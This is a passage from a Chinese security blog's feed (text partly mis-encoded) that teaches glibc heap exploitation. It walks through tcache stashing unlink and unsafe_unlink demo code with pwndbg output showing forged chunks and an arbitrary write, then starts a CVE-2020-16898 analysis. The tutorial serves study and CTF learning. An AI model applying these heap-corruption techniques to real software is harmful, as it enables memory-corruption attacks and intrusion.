¼çš„æ£€æŸ¥ï¼Œå†å°† fake chunk å–å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffea4571d0</span> â€”â–¸ <span class="number">0x55a4674bc3e0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffea4571d0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_stashing_unlink_attack.c</span><br><span class="line">   <span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">   <span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> â–º <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">   <span class="number">77</span></span><br><span class="line">   <span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">80</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp     <span class="number">0x7fffea4571b0</span> â—‚â€” <span class="number">0x900000009</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚         <span class="number">0x7fffea4571b8</span> â€”â–¸ <span class="number">0x7fffea4571d0</span> â€”â–¸ <span class="number">0x55a4674bc3e0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â—‚â€” ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚         <span class="number">0x7fffea4571c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚ rax r8  <span class="number">0x7fffea4571d0</span> â€”â–¸ <span class="number">0x55a4674bc3e0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚         <span class="number">0x7fffea4571d8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚         <span class="number">0x7fffea4571e0</span> â€”â–¸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) â€”â–¸ <span class="number">0x7fd3f030cc60</span> (main_arena+<span class="number">224</span>) â€”â–¸ <span class="number">0x7fd3f030cc50</span> (main_arena+<span class="number">208</span>) â€”â–¸ <span class="number">0x7fd3f030cc40</span> (main_arena+<span class="number">192</span>) â—‚â€” ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x7fffea4571e8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>a466c59494 main+<span class="number">619</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>d3f01480b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffea4571d0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h3><p>åˆ†é…ä¸¤ä¸ªè¶³å¤Ÿå¤§çš„ chunk ï¼Œfree åä¸ä¼šè¢«æ”¾å…¥ fastbin å’Œtcache ï¼ˆ0x420)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">  <span class="number">18</span> <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">â–º <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span></span><br><span class="line">  <span class="number">22</span> chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">  <span class="number">23</span> <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬éœ€è¦åœ¨å †ä¸Šä¼ªé€ ä¸€ä¸ª chunk ï¼ˆ æˆ‘ä»¬è®¾ç½®æˆ‘ä»¬çš„å‡å—å¤§å°ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f%E4%B8%AD%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%A3%80%E6%9F%A5%E3%80%82">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44fä¸­ä»‹ç»çš„æ£€æŸ¥ã€‚</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">29</span> chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">  <span class="number">30</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">â–º <span class="number">31</span> chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">  <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">  <span class="number">33</span> <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">  <span class="number">34</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¾ç½®å¥½ size ï¼Œ fd ï¼Œbk ä»¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x56540553d2a0</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0x56540553d280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span>         -&gt; chunk0_ptr</span><br><span class="line"><span class="number">0x56540553d2a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span>         -&gt; fake chunk</span><br><span class="line"><span class="number">0x56540553d2b0</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x0000565403b5b010</span></span><br><span class="line"><span class="number">0x56540553d2c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d2d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‡è®¾æˆ‘ä»¬åœ¨chunk0ä¸­æœ‰ä¸€ä¸ªæº¢å‡ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è‡ªç”±åœ°æ”¹å˜chunk1çš„æ•°æ®</p><p>ä¾‹å¦‚æ”¹ chunk1 çš„preve size  å’Œ size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)== False</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/unsafe_unlink.c</span><br><span class="line">   <span class="number">42</span> chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="number">43</span> <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">44</span> <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   <span class="number">45</span> chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">   <span class="number">46</span></span><br><span class="line"> â–º <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x430</span></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x56540553d6c0</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x420</span></span><br><span class="line">size : <span class="number">0x430</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">fd_nextsize : <span class="number">0x0</span></span><br><span class="line">bk_nextsize : <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±ä¼šåˆ¤æ–­ chunk0 ä¸º free çŠ¶æ€ï¼Œç„¶åæˆ‘ä»¬free chunk1_ptr å°±ä¼šå‘ç”Ÿ unlink, unlink fake chunkçš„é“¾æ¥ï¼Œè¦†ç›–chunk0_ptr</p><p>æœ€å æˆ‘ä»¬å¯ä»¥ä½¿ç”¨chunk0_ptrè¦†ç›–è‡ªèº«ï¼Œå¦å…¶æŒ‡å‘ä¸€ä¸ªä»»æ„ä½ç½®,è¾¾åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™çš„ç›®çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> â–º <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">23</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b008</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x00007f8ca43e66a0</span></span><br><span class="line"><span class="number">0x565403b5b018</span> &lt;completed&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b028</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">   <span class="number">55</span></span><br><span class="line"> â–º <span class="number">56</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">24</span> = <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">25</span> = <span class="number">0x7f8ca42210b3</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">58</span> chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"> â–º <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Heap" scheme="https://bestwing.me/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-16898 &quot;Bad Neighbor&quot; åˆ†æ</title>
    <link href="https://bestwing.me/CVE-2020-15898-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-15898-analysis.html</id>
    <published>2020-10-19T16:00:00.000Z</published>
    <updated>2020-10-21T02:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>2020å¹´10æœˆ14æ—¥ï¼Œå¾®è½¯ä¿®å¤äº†ä¸€ä¸ªç´§æ€¥æ¼æ´ï¼šWindows TCP/IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·ä¸º CVE-2020-16898ã€‚</p><p>ä»14 å·å…¬å¼€çš„ä¿¡æ¯å¯ä»¥å¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸ ipv6 åè®®æœ‰å…³ï¼Œæ¼æ´ç±»å‹ä¸ºæ ˆæº¢å‡ºçš„æ¼æ´ã€‚</p><h2 id="æ¼æ´å¯»æ‰¾"><a href="#æ¼æ´å¯»æ‰¾" class="headerlink" title="æ¼æ´å¯»æ‰¾"></a>æ¼æ´å¯»æ‰¾</h2><p>é€šè¿‡å…¬å¼€ä¿¡æ¯</p><blockquote><p>A remote code execution vulnerability exists whenâ€¯theâ€¯Windows TCP/IP stackâ€¯improperly handlesâ€¯ICMPv6 Router Advertisementâ€¯packets that use Option Type 25 (Recursive DNS Serverâ€¯Option)â€¯and a length field value that is even.â€¯In this Option, the length is counted in increments of 8 bytes, so an RDNSS option with a length of 3 should have a total length of 24 bytes. The option itself consists of five fields: Type, Length, Reserved, Lifetime, and Addresses of IPv6 Recursive DNS Servers. The first four fields always total 8 bytes, but the last field can contain a variable number of IPv6 addresses, which are 16 bytes each.â€¯As a result, the length field should always be an odd value of at least 3, per <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">RFC 8106</a>:</p></blockquote><p>ä»¥åŠè¡¥ä¸çš„ diff æˆ‘ä»¬å¤§è‡´å®šä½äº†æ¼æ´çš„ä½ç½®</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png"></a></p><p>æ¼æ´å‘ç”Ÿçš„åŸå› åº”è¯¥åœ¨ <code>Ipv6pUpdateRDNSS</code> å‡½æ•°ä¸­</p><h2 id="Router-Advertisement-RA-for-short-åè®®"><a href="#Router-Advertisement-RA-for-short-åè®®" class="headerlink" title="Router Advertisement (RA for short) åè®®"></a><code>Router Advertisement</code> (RA for short) åè®®</h2><p>é€šè¿‡ <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">rfc8106</a> æˆ‘ä»¬å¯ä»¥çŸ¥é“åè®®æŠ¥æ–‡å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç€é‡çŸ¥é“ä»¥ä¸‹å‡ ä¸ª</p><ul><li><strong>Typeï¼ˆ1ä¸ªå­—èŠ‚ï¼‰</strong>ï¼šRDNSSé€‰é¡¹ç±»å‹çš„ç±»å‹ä¸º 25ï¼ˆ0x19ï¼‰</li><li><strong>Lengthï¼ˆ1ä¸ªå­—èŠ‚ï¼‰</strong>ï¼šå¦‚æœè¯¥é€‰é¡¹ä¸­åŒ…å«ä¸€ä¸ª IPv6 åœ°å€ï¼Œåˆ™é•¿åº¦å–æœ€å°å€¼3 ã€‚æ¯å¢åŠ ä¸€ä¸ª RDNSS åœ°å€ï¼Œé•¿åº¦å°±ä¼šå¢åŠ 2ã€‚æ¥æ”¶å™¨ä½¿ç”¨â€œé•¿åº¦â€å­—æ®µæ¥ç¡®å®šé€‰é¡¹ä¸­IPv6åœ°å€çš„æ•°é‡</li><li><strong>Addresses of IPv6 Recursive DNS Serversï¼ˆå¯å˜é•¿åº¦ï¼Œç”±â€œLengthâ€å­—æ®µç¡®å®šï¼‰</strong>ï¼šä¸€ä¸ªæˆ–å¤šä¸ªé€’å½’DNSæœåŠ¡å™¨çš„ 128 ä½ IPv6 åœ°å€ ã€‚åœ°å€ä¸ªæ•°ä¸ºï¼ˆLength - 1ï¼‰/ 2</li></ul><p>åè®®ä¸­è§„å®šï¼š</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o  The validity of DNS options is checked with the Length field;</span><br><span class="line">   that is, the value of the Length field in the RDNSS option is</span><br><span class="line">   greater than or equal to the minimum value (3) and satisfies the</span><br><span class="line">   requirement that (Length - 1) % 2 &#x3D;&#x3D; 0.  The value of the Length</span><br><span class="line">   field in the DNSSL option is greater than or equal to the minimum</span><br><span class="line">   